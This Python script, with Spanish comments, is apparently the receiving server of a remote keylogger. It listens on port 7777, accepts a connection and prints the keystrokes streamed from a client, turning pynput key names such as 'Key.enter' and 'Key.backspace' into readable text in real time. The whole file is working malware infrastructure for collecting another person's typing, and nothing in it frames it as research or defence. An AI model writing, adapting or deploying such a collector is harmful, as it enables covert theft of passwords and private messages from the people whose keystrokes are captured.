import socket
import colorama
from colorama import Fore, Style, Back
import sys

# Inicializar colorama
colorama.init(autoreset=True)

# Dirección IP y puerto del servidor
HOST = '0.0.0.0'  # Escuchar en todas las interfaces de red
PORT = 7777       # Puerto actualizado

# Crear un socket para escuchar las conexiones entrantes
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

# Imprimir el estado de escucha con colores
print(Fore.GREEN + Style.BRIGHT + f"\n{'='*60}")
print(Fore.GREEN + Style.BRIGHT + f"🟢 Escuchando en {HOST}:{PORT}...")
print(Fore.GREEN + Style.BRIGHT + f"{'='*60}\n")

# Aceptar la conexión del cliente
client_socket, client_address = server_socket.accept()
print(Fore.CYAN + Style.BRIGHT + f"🔗 Conexión establecida con {client_address}\n")
print(Fore.YELLOW + Style.BRIGHT + f"{'-'*60}")

# Función para simplificar las teclas
def simplify_key(key):
    key_mappings = {
        'Key.space': ' ',
        'Key.enter': '[ENTER]',
        'Key.tab': '[TAB]',
        'Key.backspace': '[BACKSPACE]',
        'Key.shift': '',
        'Key.ctrl_l': '[CTRL]',
        'Key.alt_l': '[ALT]',
        'Key.cmd': '[CMD]',
    }
    return key_mappings.get(key, key.replace('Key.', '').replace('\'', ''))

# Recibir y procesar las teclas en tiempo real
try:
    while True:
        data = client_socket.recv(1024).decode('utf-8')
        if data:
            keys = data.split(' | ')
            cleaned_text = ''.join([simplify_key(key) for key in keys])
            print(Fore.YELLOW + Style.BRIGHT + '\rTexto recibido: ' + Fore.WHITE + cleaned_text + ' '*10)
        else:
            break
except Exception as e:
    print(Fore.RED + Style.BRIGHT + f"\n❌ Error en la conexión: {e}\n")
finally:
    client_socket.close()
    server_socket.close()
    print(Fore.MAGENTA + Style.BRIGHT + "\n🔒 Conexión cerrada.\n")
